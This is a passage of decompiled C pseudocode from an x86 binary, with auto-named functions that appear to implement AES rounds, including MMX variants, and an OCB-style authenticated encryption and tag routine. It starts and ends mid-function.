  if ( Size - 1 > 0xE || (unsigned int)(a4 - 1) > 0xF )
    return -1;
  v9 = 0;
  memcpy((char *)&v10 - Size, Src, Size);
  ((_BYTE *)&v9 - Size)[3] |= 1u;
  v22 = v9;
  v20 = (unsigned __int8)(16 * a4);
  v8 = *(_DWORD *)(a1 + 8);
  v4 = *(void (__cdecl **)(int *, __int64 *, int))a1;
  v21 = 0i64;
  HIBYTE(v22) = HIBYTE(v9) & 0xC0;
  v4(&v20, &v10, v8);
  v16 = BYTE1(v10) ^ v10;
  v13 = v10;
  v17 = *(_DWORD *)((char *)&v10 + 1) ^ *(_DWORD *)((char *)&v10 + 2);
  v18 = *(_WORD *)((char *)&v10 + 5) ^ HIWORD(v10);
  v14 = v11;
  v5 = HIBYTE(v9) & 7;
  v6 = (unsigned __int8)(HIBYTE(v9) & 0x3F) >> 3;
  v15 = v12;
  v19 = HIBYTE(v10) ^ v11;
  sub_40D3D0((int)&v13 + v6, HIBYTE(v9) & 7, a1 + 136);
  *(_BYTE *)(a1 + 151) |= (unsigned __int8)((-1 << (8 - v5)) & *(&v16 + v6)) >> (8 - v5);
  return 1;
}

//----- (0040D960) --------------------------------------------------------
int __cdecl sub_40D960(int a1, int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  int v4; // edx
  int v5; // ebp
  unsigned __int64 v6; // kr08_8
  unsigned int v7; // ebx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // edx
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int v13; // edx
  int v14; // ecx
  int v15; // edx
  void (__cdecl *v16)(int *, int *, int); // eax
  int v17; // eax
  int v18; // ecx
  int v19; // edi
  int v20; // eax
  int v21; // edx
  int v22; // eax
  int v23; // ecx
  int v24; // edx
  void (__cdecl *v25)(int *, int *, int); // eax
  int v26; // eax
  int v27; // ecx
  int v29; // [esp-10h] [ebp-58h]
  int v30; // [esp-4h] [ebp-4Ch]
  unsigned int i; // [esp+10h] [ebp-38h]
  unsigned __int64 v32; // [esp+18h] [ebp-30h]
  int v33; // [esp+24h] [ebp-24h] BYREF
  int v34; // [esp+28h] [ebp-20h]
  int v35; // [esp+2Ch] [ebp-1Ch]
  int v36; // [esp+30h] [ebp-18h]
  int v37; // [esp+34h] [ebp-14h] BYREF
  int v38; // [esp+38h] [ebp-10h]
  int v39; // [esp+3Ch] [ebp-Ch]
  int v40; // [esp+40h] [ebp-8h]

  v3 = a3 >> 4;
  v5 = ((unsigned __int64)(a3 >> 4) + *(_QWORD *)(a1 + 72)) >> 32;
  v4 = (a3 >> 4) + *(_DWORD *)(a1 + 72);
  v6 = *(_QWORD *)(a1 + 72) + 1i64;
  v7 = HIDWORD(v6);
  v8 = v6;
  v32 = (a3 >> 4) + *(_QWORD *)(a1 + 72);
  if ( v6 > v32 )
  {
LABEL_7:
    v19 = a3 & 0xF;
    if ( (a3 & 0xF) != 0 )
    {
      *(_DWORD *)(a1 + 108) ^= *(_DWORD *)(a1 + 36);
      v20 = *(_DWORD *)(a1 + 44);
      *(_DWORD *)(a1 + 104) ^= *(_DWORD *)(a1 + 32);
      *(_DWORD *)(a1 + 116) ^= v20;
      *(_DWORD *)(a1 + 112) ^= *(_DWORD *)(a1 + 40);
      v33 = 0;
      v34 = 0;
      v35 = 0;
      v36 = 0;
      memcpy(&v33, (const void *)(a2 + 16 * v3), v19);
      v21 = *(_DWORD *)(a1 + 104);
      v22 = *(_DWORD *)(a1 + 108);
      *((_BYTE *)&v33 + v19) = 0x80;
      v23 = *(_DWORD *)(a1 + 112) ^ v35;
      v37 = v33 ^ v21;
      v24 = *(_DWORD *)(a1 + 116) ^ v36;
      v38 = v34 ^ v22;
      v29 = *(_DWORD *)(a1 + 8);
      v25 = *(void (__cdecl **)(int *, int *, int))a1;
      v39 = v23;
      v40 = v24;
      v25(&v37, &v33, v29);
      *(_DWORD *)(a1 + 120) ^= v33;
      v26 = v35;
      *(_DWORD *)(a1 + 124) ^= v34;
      v27 = v36;
      *(_DWORD *)(a1 + 128) ^= v26;
      v4 = v32;
      *(_DWORD *)(a1 + 132) ^= v27;
    }
    *(_DWORD *)(a1 + 76) = v5;
    *(_DWORD *)(a1 + 72) = v4;
    return 1;
  }
  else
  {
    while ( 1 )
    {
      v9 = v8;
      v10 = v7;
      for ( i = 0; (v9 & 1) == 0; v10 >>= 1 )
      {
        ++i;
        v9 = __PAIR64__(v10, v9) >> 1;
      }
      v11 = sub_40D530((_DWORD *)a1, i);
      if ( !v11 )
        return 0;
      *(_DWORD *)(a1 + 104) ^= *v11;
      *(_DWORD *)(a1 + 108) ^= v11[1];
      *(_DWORD *)(a1 + 112) ^= v11[2];
      *(_DWORD *)(a1 + 116) ^= v11[3];
      v12 = (_DWORD *)(a2 + 16 * (v8 - *(_DWORD *)(a1 + 72) - 1));
      v13 = v12[1] ^ *(_DWORD *)(a1 + 108);
      v33 = *v12 ^ *(_DWORD *)(a1 + 104);
      v34 = v13;
      v14 = *(_DWORD *)(a1 + 112) ^ v12[2];
      v15 = *(_DWORD *)(a1 + 116) ^ v12[3];
      v30 = *(_DWORD *)(a1 + 8);
      v16 = *(void (__cdecl **)(int *, int *, int))a1;
      v35 = v14;
      v36 = v15;
      v16(&v33, &v37, v30);
      *(_DWORD *)(a1 + 120) ^= v37;
      v17 = v39;
      v18 = v40;
      *(_DWORD *)(a1 + 124) ^= v38;
      *(_DWORD *)(a1 + 128) ^= v17;
      *(_DWORD *)(a1 + 132) ^= v18;
      v5 = HIDWORD(v32);
      v7 = (__PAIR64__(v7, v8++) + 1) >> 32;
      if ( __PAIR64__(v7, v8) > v32 )
      {
        v3 = a3 >> 4;
        v4 = v32;
        goto LABEL_7;
      }
    }
  }
}

//----- (0040DBA0) --------------------------------------------------------
int __cdecl sub_40DBA0(int a1, int a2, int a3, unsigned int a4)
{
  char v4; // cl
  unsigned int v5; // ebp
  unsigned int v6; // ebx
  unsigned int v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int i; // eax
  unsigned int v12; // ebp
  unsigned int v13; // edi
  unsigned int v14; // ecx
  unsigned int v15; // edx
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  int v18; // edx
  int v19; // ecx
  int v20; // edx
  int v21; // edx
  int v22; // eax
  int v23; // edx
  int *v24; // eax
  int v25; // edx
  unsigned int v26; // edi
  int v27; // edx
  int v28; // ecx
  unsigned int v29; // eax
  char v30; // dl
  int v31; // edx
  int v32; // ecx
  unsigned __int64 v33; // [esp+14h] [ebp-48h]
  unsigned int j; // [esp+1Ch] [ebp-40h]
  int v35; // [esp+28h] [ebp-34h] BYREF
  int v36; // [esp+2Ch] [ebp-30h]
  int v37; // [esp+30h] [ebp-2Ch]
  int v38; // [esp+34h] [ebp-28h]
  int v39[4]; // [esp+38h] [ebp-24h] BYREF
  char v40[16]; // [esp+48h] [ebp-14h] BYREF

  v4 = a4;
  v5 = *(_DWORD *)(a1 + 84);
  v6 = a4 >> 4;
  v7 = *(_DWORD *)(a1 + 80);
  v8 = v7 + (a4 >> 4);
  v33 = __PAIR64__(v5, v7) + (a4 >> 4);
  if ( a4 >> 4 && !HIDWORD(v33) && *(_DWORD *)(a1 + 16) )
  {
    v9 = 0;
    for ( i = v8 >> 1; i; i >>= 1 )
      ++v9;
    if ( !sub_40D530((_DWORD *)a1, v9) )
      return 0;
    (*(void (__cdecl **)(int, int, unsigned int, _DWORD, int, int, _DWORD, int))(a1 + 16))(
      a2,
      a3,
      v6,
      *(_DWORD *)(a1 + 8),
      *(_DWORD *)(a1 + 80) + 1,
      a1 + 136,
      *(_DWORD *)(a1 + 64),
      a1 + 152);
LABEL_15:
    v4 = a4;
    v8 = v33;
  }
  else
  {
    v12 = (__PAIR64__(v5, v7) + 1) >> 32;
    v13 = v7 + 1;
    if ( __PAIR64__(v12, v13) <= __PAIR64__(HIDWORD(v33), v8) )
    {
      while ( 1 )
      {
        v14 = v13;
        v15 = v12;
        for ( j = 0; (v14 & 1) == 0; v15 >>= 1 )
        {
          ++j;
          v14 = __PAIR64__(v15, v14) >> 1;
        }
        v16 = sub_40D530((_DWORD *)a1, j);
        if ( !v16 )
          return 0;
        *(_DWORD *)(a1 + 136) ^= *v16;
        *(_DWORD *)(a1 + 140) ^= v16[1];
        *(_DWORD *)(a1 + 144) ^= v16[2];
        *(_DWORD *)(a1 + 148) ^= v16[3];
        v17 = (_DWORD *)(a2 + 16 * (v13 - *(_DWORD *)(a1 + 80) - 1));
        v18 = v17[1] ^ *(_DWORD *)(a1 + 140);
        v35 = *v17 ^ *(_DWORD *)(a1 + 136);
        v19 = *(_DWORD *)(a1 + 144);
        v36 = v18;
        v20 = v17[3] ^ *(_DWORD *)(a1 + 148);
        v37 = v17[2] ^ v19;
        v38 = v20;
        *(_DWORD *)(a1 + 152) ^= *v17;
        *(_DWORD *)(a1 + 156) ^= v17[1];
        *(_DWORD *)(a1 + 160) ^= v17[2];
        v21 = v17[3];
        v22 = *(_DWORD *)(a1 + 8);
        *(_DWORD *)(a1 + 164) ^= v21;
        (*(void (__cdecl **)(int *, int *, int))a1)(&v35, v39, v22);
        v23 = v39[1] ^ *(_DWORD *)(a1 + 140);
        v24 = (int *)(a3 + 16 * (v13 - *(_DWORD *)(a1 + 80) - 1));
        *v24 = v39[0] ^ *(_DWORD *)(a1 + 136);
        v24[1] = v23;
        v25 = v39[3] ^ *(_DWORD *)(a1 + 148);
        v12 = (__PAIR64__(v12, v13++) + 1) >> 32;
        v24[2] = v39[2] ^ *(_DWORD *)(a1 + 144);
        v24[3] = v25;
        if ( __PAIR64__(v12, v13) > v33 )
        {
          v6 = a4 >> 4;
          goto LABEL_15;
        }
      }
    }
  }
  v26 = v4 & 0xF;
  if ( (v4 & 0xF) != 0 )
  {
    *(_DWORD *)(a1 + 136) ^= *(_DWORD *)(a1 + 32);
    *(_DWORD *)(a1 + 140) ^= *(_DWORD *)(a1 + 36);
    v27 = *(_DWORD *)(a1 + 44);
    *(_DWORD *)(a1 + 144) ^= *(_DWORD *)(a1 + 40);
    v28 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 148) ^= v27;
    (*(void (__cdecl **)(int, char *, int))a1)(a1 + 136, v40, v28);
    v29 = 0;
    do
    {
      v30 = v40[v29] ^ *(_BYTE *)(v29 + 16 * v6 + a2);
      ++v29;
      *(_BYTE *)(a3 + 16 * v6 + v29 - 1) = v30;
    }
    while ( v29 < v26 );
    v35 = 0;
    v36 = 0;
    v37 = 0;
    v38 = 0;
    memcpy(&v35, (const void *)(a2 + 16 * v6), v26);
    *((_BYTE *)&v35 + v26) = 0x80;
    *(_DWORD *)(a1 + 152) ^= v35;
    v31 = v36;
    *(_DWORD *)(a1 + 160) ^= v37;
    v32 = v38;
    *(_DWORD *)(a1 + 156) ^= v31;
    v8 = v33;
    *(_DWORD *)(a1 + 164) ^= v32;
  }
  *(_DWORD *)(a1 + 80) = v8;
  *(_DWORD *)(a1 + 84) = HIDWORD(v33);
  return 1;
}
// 40DBA0: using guessed type char var_14[16];

//----- (0040DEC0) --------------------------------------------------------
int __cdecl sub_40DEC0(int a1, int a2, int a3, unsigned int a4)
{
  char v4; // cl
  unsigned int v5; // ebp
  unsigned int v6; // ebx
  unsigned int v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int i; // eax
  unsigned int v12; // ebp
  unsigned int v13; // edi
  unsigned int v14; // ecx
  unsigned int v15; // edx
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  int v18; // edx
  int v19; // ecx
  int v20; // edx
  void (__cdecl *v21)(int *, int *, int); // eax
  int v22; // edx
  int *v23; // eax
  int v24; // edx
  int v25; // ecx
  unsigned int v26; // edi
  int v27; // edx
  int v28; // ecx
  unsigned int v29; // eax
  char v30; // dl
  int v31; // edx
  int v32; // ecx
  int v33; // [esp-4h] [ebp-60h]
  unsigned __int64 v34; // [esp+14h] [ebp-48h]
  unsigned int j; // [esp+1Ch] [ebp-40h]
  int v36; // [esp+28h] [ebp-34h] BYREF
  int v37; // [esp+2Ch] [ebp-30h]
  int v38; // [esp+30h] [ebp-2Ch]
  int v39; // [esp+34h] [ebp-28h]
  int v40[4]; // [esp+38h] [ebp-24h] BYREF
  char v41[16]; // [esp+48h] [ebp-14h] BYREF

  v4 = a4;
  v5 = *(_DWORD *)(a1 + 84);
  v6 = a4 >> 4;
  v7 = *(_DWORD *)(a1 + 80);
  v8 = v7 + (a4 >> 4);
  v34 = __PAIR64__(v5, v7) + (a4 >> 4);
  if ( a4 >> 4 && !HIDWORD(v34) && *(_DWORD *)(a1 + 16) )
  {
    v9 = 0;
    for ( i = v8 >> 1; i; i >>= 1 )
      ++v9;
    if ( !sub_40D530((_DWORD *)a1, v9) )
      return 0;
    (*(void (__cdecl **)(int, int, unsigned int, _DWORD, int, int, _DWORD, int))(a1 + 16))(
      a2,
      a3,
      v6,
      *(_DWORD *)(a1 + 12),
      *(_DWORD *)(a1 + 80) + 1,
      a1 + 136,
      *(_DWORD *)(a1 + 64),
      a1 + 152);
LABEL_15:
    v4 = a4;
    v8 = v34;
  }
  else
  {
    v12 = (__PAIR64__(v5, v7) + 1) >> 32;
    v13 = v7 + 1;
    if ( __PAIR64__(v12, v13) <= __PAIR64__(HIDWORD(v34), v8) )
    {
      while ( 1 )
      {
        v14 = v13;
        v15 = v12;
        for ( j = 0; (v14 & 1) == 0; v15 >>= 1 )
        {
          ++j;
          v14 = __PAIR64__(v15, v14) >> 1;
        }
        v16 = sub_40D530((_DWORD *)a1, j);
        if ( !v16 )
          return 0;
        *(_DWORD *)(a1 + 136) ^= *v16;
        *(_DWORD *)(a1 + 140) ^= v16[1];
        *(_DWORD *)(a1 + 144) ^= v16[2];
        *(_DWORD *)(a1 + 148) ^= v16[3];
        v17 = (_DWORD *)(a2 + 16 * (v13 - *(_DWORD *)(a1 + 80) - 1));
        v18 = v17[1] ^ *(_DWORD *)(a1 + 140);
        v36 = *v17 ^ *(_DWORD *)(a1 + 136);
        v37 = v18;
        v19 = *(_DWORD *)(a1 + 144) ^ v17[2];
        v20 = *(_DWORD *)(a1 + 148) ^ v17[3];
        v33 = *(_DWORD *)(a1 + 12);
        v21 = *(void (__cdecl **)(int *, int *, int))(a1 + 4);
        v38 = v19;
        v39 = v20;
        v21(&v36, v40, v33);
        v22 = v40[1] ^ *(_DWORD *)(a1 + 140);
        v23 = (int *)(a3 + 16 * (v13 - *(_DWORD *)(a1 + 80) - 1));
        *v23 = v40[0] ^ *(_DWORD *)(a1 + 136);
        v23[1] = v22;
        v24 = v40[3] ^ *(_DWORD *)(a1 + 148);
        v23[2] = v40[2] ^ *(_DWORD *)(a1 + 144);
        v25 = *v23;
        v23[3] = v24;
        *(_DWORD *)(a1 + 152) ^= v25;
        *(_DWORD *)(a1 + 156) ^= v23[1];
        *(_DWORD *)(a1 + 160) ^= v23[2];
        *(_DWORD *)(a1 + 164) ^= v23[3];
        v12 = (__PAIR64__(v12, v13++) + 1) >> 32;
        if ( __PAIR64__(v12, v13) > v34 )
        {
          v6 = a4 >> 4;
          goto LABEL_15;
        }
      }
    }
  }
  v26 = v4 & 0xF;
  if ( (v4 & 0xF) != 0 )
  {
    *(_DWORD *)(a1 + 136) ^= *(_DWORD *)(a1 + 32);
    *(_DWORD *)(a1 + 140) ^= *(_DWORD *)(a1 + 36);
    v27 = *(_DWORD *)(a1 + 44);
    *(_DWORD *)(a1 + 144) ^= *(_DWORD *)(a1 + 40);
    v28 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 148) ^= v27;
    (*(void (__cdecl **)(int, char *, int))a1)(a1 + 136, v41, v28);
    v29 = 0;
    do
    {
      v30 = v41[v29] ^ *(_BYTE *)(v29 + 16 * v6 + a2);
      ++v29;
      *(_BYTE *)(a3 + 16 * v6 + v29 - 1) = v30;
    }
    while ( v29 < v26 );
    v36 = 0;
    v37 = 0;
    v38 = 0;
    v39 = 0;
    memcpy(&v36, (const void *)(a3 + 16 * v6), v26);
    *((_BYTE *)&v36 + v26) = 0x80;
    *(_DWORD *)(a1 + 152) ^= v36;
    v31 = v37;
    *(_DWORD *)(a1 + 160) ^= v38;
    v32 = v39;
    *(_DWORD *)(a1 + 156) ^= v31;
    v8 = v34;
    *(_DWORD *)(a1 + 164) ^= v32;
  }
  *(_DWORD *)(a1 + 80) = v8;
  *(_DWORD *)(a1 + 84) = HIDWORD(v34);
  return 1;
}
// 40DEC0: using guessed type char var_14[16];

//----- (0040E1E0) --------------------------------------------------------
int __cdecl sub_40E1E0(int a1, _BYTE *a2, int a3)
{
  int v3; // ecx
  int v4; // edx
  int v5; // ebp
  int v6; // eax
  int v7; // edi
  int v8; // ecx
  int v9; // edx
  void (__cdecl *v10)(int *, int *, int); // eax
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v15; // [esp-8h] [ebp-38h]
  int v16; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+10h] [ebp-20h]
  int v18; // [esp+14h] [ebp-1Ch]
  int v19; // [esp+18h] [ebp-18h]
  int v20[4]; // [esp+1Ch] [ebp-14h] BYREF

  v3 = *(_DWORD *)(a1 + 140) ^ *(_DWORD *)(a1 + 156);
  v4 = *(_DWORD *)(a1 + 144) ^ *(_DWORD *)(a1 + 160);
  v5 = *(_DWORD *)(a1 + 136) ^ *(_DWORD *)(a1 + 152) ^ *(_DWORD *)(a1 + 48);
  v16 = *(_DWORD *)(a1 + 136) ^ *(_DWORD *)(a1 + 152);
  v6 = v3 ^ *(_DWORD *)(a1 + 52);
  v7 = *(_DWORD *)(a1 + 148) ^ *(_DWORD *)(a1 + 164);
  v17 = v3;
  v8 = v4 ^ *(_DWORD *)(a1 + 56);
  v18 = v4;
  v9 = *(_DWORD *)(a1 + 60);
  v20[1] = v6;
  v15 = *(_DWORD *)(a1 + 8);
  v10 = *(void (__cdecl **)(int *, int *, int))a1;
  v20[2] = v8;
  v20[3] = v7 ^ v9;
  v19 = v7;
  v20[0] = v5;
  v10(v20, &v16, v15);
  v11 = v17 ^ *(_DWORD *)(a1 + 124);
  *(_DWORD *)(a1 + 88) = v16 ^ *(_DWORD *)(a1 + 120);
  v12 = v18 ^ *(_DWORD *)(a1 + 128);
  *(_DWORD *)(a1 + 92) = v11;
  v13 = v19 ^ *(_DWORD *)(a1 + 132);
  *(_DWORD *)(a1 + 96) = v12;
  *(_DWORD *)(a1 + 100) = v13;
  if ( (unsigned int)(a3 - 1) <= 0xF && a2 )
    return sub_413A50((char *)(a1 + 88), a2, a3);
  else
    return -1;
}

//----- (0040E2F0) --------------------------------------------------------
int __cdecl sub_40E2F0(int a1, void *a2, size_t Size)
{
  if ( Size - 1 > 0xF )
    return -1;
  sub_40E1E0(a1, 0, 0);
  memcpy(a2, (const void *)(a1 + 88), Size);
  return 1;
}

//----- (0040E330) --------------------------------------------------------
int __cdecl sub_40E330(int a1)
{
  int result; // eax

  if ( a1 )
  {
    sub_4134B0(*(_BYTE **)(a1 + 64), 16 * *(_DWORD *)(a1 + 24));
    return sub_4139E0((_BYTE *)a1, 0xA8u);
  }
  return result;
}

//----- (0040E380) --------------------------------------------------------
int __usercall sub_40E380@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        _DWORD *a6@<edi>,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  unsigned int v13; // eax
  unsigned int v14; // ebx
  unsigned int v15; // ecx
  unsigned int v16; // edx
  int v17; // esi
  unsigned int v18; // ebx
  int v19; // esi
  int v20; // edx
  int v21; // ecx
  int v22; // ebp
  unsigned int v23; // esi
  int v24; // ecx
  unsigned int v25; // esi
  int v26; // edx
  unsigned int v27; // esi
  int v28; // eax
  unsigned int v29; // esi
  int v31; // [esp+4h] [ebp+4h]
  int v32; // [esp+8h] [ebp+8h]
  _DWORD *v33; // [esp+14h] [ebp+14h]

  v33 = a6;
  v13 = *a6 ^ a1;
  v14 = a6[1] ^ a4;
  v15 = a6[2] ^ a3;
  v16 = a6[3] ^ a2;
  do
  {
    v31 = (*(unsigned __int8 *)(a5 + HIBYTE(v16) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v15) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v14) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v13 - 128);
    v17 = (unsigned __int8)v14;
    v18 = HIWORD(v14);
    v32 = (*(unsigned __int8 *)(a5 + HIBYTE(v13) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v16) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v15) - 128) << 8) ^ *(unsigned __int8 *)(a5 + v17 - 128);
    v19 = (*(unsigned __int8 *)(a5 + BYTE1(v18) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + BYTE2(v13) - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v16) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v15 - 128);
    v20 = (*(unsigned __int8 *)(a5 + HIBYTE(v15) - 128) << 24) ^ (*(unsigned __int8 *)(a5 + (unsigned __int8)v18 - 128) << 16) ^ (*(unsigned __int8 *)(a5 + BYTE1(v13) - 128) << 8) ^ *(unsigned __int8 *)(a5 + (unsigned __int8)v16 - 128);
    v21 = v19;
    v22 = __ROR4__(v19, 16);
    v23 = (2 * v19) & 0xFEFEFEFE ^ ((v19 & 0x80808080) - ((v19 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v24 = __ROR4__(v21, 24) ^ v22 ^ v23 ^ __ROL4__(v23 ^ v21, 24);
    v25 = (2 * v20) & 0xFEFEFEFE ^ ((v20 & 0x80808080) - ((v20 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v26 = __ROR4__(v20, 24) ^ __ROR4__(v20, 16) ^ v25 ^ __ROL4__(v25 ^ v20, 24);
    v27 = (2 * v31) & 0xFEFEFEFE ^ ((v31 & 0x80808080) - ((v31 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    v28 = __ROR4__(v31, 24) ^ __ROR4__(v31, 16) ^ v27 ^ __ROL4__(v27 ^ v31, 24);
    v29 = (2 * v32) & 0xFEFEFEFE ^ ((v32 & 0x80808080) - ((v32 & 0x80808080) >> 7)) & 0x1B1B1B1B;
    a5 = a13;
    v13 = v33[4] ^ v28;
    v14 = v33[5] ^ __ROR4__(v32, 24) ^ __ROR4__(v32, 16) ^ v29 ^ __ROL4__(v29 ^ v32, 24);
    v15 = v33[6] ^ v24;
    v16 = v33[7] ^ v26;
    v33 += 4;
  }
  while ( v33 < &a6[4 * a6[60] - 4] );
  return v33[4] ^ (*(unsigned __int8 *)(a13 + HIBYTE(v16) - 128) << 24) ^ (*(unsigned __int8 *)(a13 + BYTE2(v15) - 128) << 16) ^ (*(unsigned __int8 *)(a13 + BYTE1(v14) - 128) << 8) ^ *(unsigned __int8 *)(a13 + (unsigned __int8)v13 - 128);
}

//----- (0040E6E0) --------------------------------------------------------
int __usercall sub_40E6E0@<eax>(int a1@<ebp>, __m64 *a2@<edi>, __m64 a3@<mm0>, __m64 a4@<mm4>)
{
  __m64 v4; // mm0
  __m64 v5; // mm4
  unsigned int v6; // eax
  unsigned int v7; // ebx
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  int v14; // esi
  unsigned int v15; // eax
  __m64 v16; // mm0
  int v17; // ecx
  int v18; // ebx
  int v19; // ecx
  int v20; // edi
  __m64 v21; // mm0
  int v22; // ecx
  int result; // eax
  __m64 v24; // mm4
  __m64 v25; // mm1
  __m64 v26; // mm5
  __m64 v27; // mm2
  __m64 v28; // mm6
  __m64 v29; // mm0
  __m64 v30; // mm4
  __m64 v31; // mm1
  __m64 v32; // mm5
  __m64 v33; // mm0
  __m64 v34; // mm4
  __m64 v35; // mm2
  __m64 v36; // mm6
  __m64 *v41; // [esp+14h] [ebp+14h]
  unsigned int v43; // [esp+18h] [ebp+18h]

  v4 = _m_pxor(a3, (__m64)a2->m64_u64);
  v5 = _m_pxor(a4, a2[1]);
  v43 = (unsigned int)&a2[2 * a2[30].m64_i32[0] - 2];
  while ( 1 )
  {
    v6 = _mm_cvtsi64_si32(_m_pshufw(v4, 8));
    v7 = _mm_cvtsi64_si32(_m_pshufw(v5, 13));
    v41 = a2;
    v8 = *(unsigned __int8 *)(a1 + (unsigned __int8)v6 - 128);
    v9 = *(unsigned __int8 *)(a1 + BYTE1(v6) - 128);
    v6 >>= 16;
    v10 = (*(unsigned __int8 *)(a1 + (unsigned __int8)v7 - 128) << 16) | v8;
    v11 = *(unsigned __int8 *)(a1 + BYTE1(v7) - 128) << 24;
    v7 >>= 16;
    v12 = v11 | (v9 << 8);
    v13 = (*(unsigned __int8 *)(a1 + BYTE1(v7) - 128) << 24) | (*(unsigned __int8 *)(a1 + BYTE1(v6) - 128) << 8) | v10;
    v14 = *(unsigned __int8 *)(a1 + (unsigned __int8)v6 - 128);
    v15 = _mm_cvtsi64_si32(_m_pshufw(v4, 13));
    v16 = _mm_cvtsi32_si64(v13);
    v17 = *(unsigned __int8 *)(a1 + (unsigned __int8)v7 - 128) << 16;
    v18 = _mm_cvtsi64_si32(_m_pshufw(v5, 8));
    v19 = (*(unsigned __int8 *)(a1 + BYTE1(v18) - 128) << 8) | (*(unsigned __int8 *)(a1 + BYTE1(v15) - 128) << 24) | v14 | v17;
    v20 = (unsigned __int8)v15;
    v15 >>= 16;
    v21 = _m_punpckldq(v16, _mm_cvtsi32_si64(v19));
    v22 = (*(unsigned __int8 *)(a1 + BYTE1(v15) - 128) << 24) | *(unsigned __int8 *)(a1 + (unsigned __int8)v18 - 128) | (*(unsigned __int8 *)(a1 + v20 - 128) << 16);
    result = *(unsigned __int8 *)(a1 + (unsigned __int8)v15 - 128) << 16;
    v24 = _m_punpckldq(
            _mm_cvtsi32_si64((*(unsigned __int8 *)(a1 + HIBYTE(v18) - 128) << 8) | (unsigned int)v22),
            _mm_cvtsi32_si64(*(unsigned __int8 *)(a1 + BYTE2(v18) - 128) | result | (unsigned int)v12));
    a2 = v41 + 2;
    if ( (unsigned int)&v41[2] > v43 )
      break;
    v25 = v21;
    v26 = v24;
    v27 = _m_pshufw(v21, 177);
    v28 = _m_pshufw(v24, 177);
    v29 = _m_pxor(_m_paddb(v21, v21), _m_pand(_m_pcmpgtb(0i64, v21), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v30 = _m_pxor(_m_paddb(v24, v24), _m_pand(_m_pcmpgtb(0i64, v24), (__m64)0x1B1B1B1B1B1B1B1Bi64));
    v31 = _m_pxor(v25, v29);
    v32 = _m_pxor(v26, v30);
    v33 = _m_pxor(v29, v27);
    v34 = _m_pxor(v30, v28);
    v35 = _m_pshufw(v27, 177);
    v36 = _m_pshufw(v28, 177);
    v4 = _m_pxor(
           _m_pxor(
             _m_pxor(_m_pxor(_m_pxor(v33, _m_pslldi(v35, 8u)), _m_psrldi(v35, 0x18u)), _m_psrldi(v31, 8u)),
             _m_pslldi(v31, 0x18u)),
           (__m64)a2->m64_u64);
    v5 = _m_pxor(
           _m_pxor(
             _m_pxor(_m_pxor(_m_pxor(v34, _m_pslldi(v36, 8u)), _m_psrldi(v36, 0x18u)), _m_psrldi(v32, 8u)),
             _m_pslldi(v32, 0x18u)),
           v41[3]);
  }
  return result;
}

//----- (0040E8F0) --------------------------------------------------------
unsigned int __usercall sub_40E8F0@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        _DWORD *a6@<edi>)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // ecx
  unsigned int v9; // edx
  int v10; // esi
  unsigned int v11; // ebx
  int v12; // esi
  int v13; // edx
  int v16; // [esp+4h] [ebp+4h]
  int v18; // [esp+8h] [ebp+8h]
  _DWORD *v22; // [esp+14h] [ebp+14h]

  v22 = a6;
  v6 = *a6 ^ a1;
  v7 = a6[1] ^ a4;
  v8 = a6[2] ^ a3;
  v9 = a6[3] ^ a2;
  do
  {
    v16 = *(_DWORD *)(a5 + 8 * HIBYTE(v9) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v8) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v7) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v6);
    v10 = (unsigned __int8)v7;
    v11 = HIWORD(v7);
    v18 = *(_DWORD *)(a5 + 8 * HIBYTE(v6) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v9) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v8) + 3) ^ *(_DWORD *)(a5 + 8 * v10);
    v12 = *(_DWORD *)(a5 + 8 * BYTE1(v11) + 1) ^ *(_DWORD *)(a5 + 8 * BYTE2(v6) + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v9) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v8);
    v13 = *(_DWORD *)(a5 + 8 * HIBYTE(v8) + 1) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v11 + 2) ^ *(_DWORD *)(a5 + 8 * BYTE1(v6) + 3) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v9);
    v6 = v22[4] ^ v16;
    v7 = v22[5] ^ v18;
    v8 = v22[6] ^ v12;
    v9 = v22[7] ^ v13;
    v22 += 4;
  }
  while ( v22 < &a6[4 * a6[60] - 4] );
